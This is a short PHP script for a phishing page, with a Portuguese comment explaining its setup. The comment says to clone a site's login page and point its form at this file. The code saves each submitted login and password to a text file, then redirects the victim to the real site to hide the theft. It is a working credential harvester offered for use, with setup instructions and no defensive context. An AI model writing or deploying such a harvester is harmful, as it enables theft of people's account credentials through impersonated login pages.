/* Pagina criada para capturar os dados de login e senha do usuário.
É preciso criar um arquivo senhas.txt onde serão armazenados os dados capturados e 
alterar o action da pagina de index clonada para redirecionar para esta pagina, 
além dos nomes dos campos de login e senha serem identicos ao index */


<?php

$login = $_POST["login"] . "\n";
$senha = $_POST["senha"] . "\n";

$file = fopen("senhas.txt","a");

$salvaLogin = fwrite($file, $login);
$salvaSenha = fwrite($file, $senha);

fclose($file);
header("location: http://enderecoreal/login.php");
?>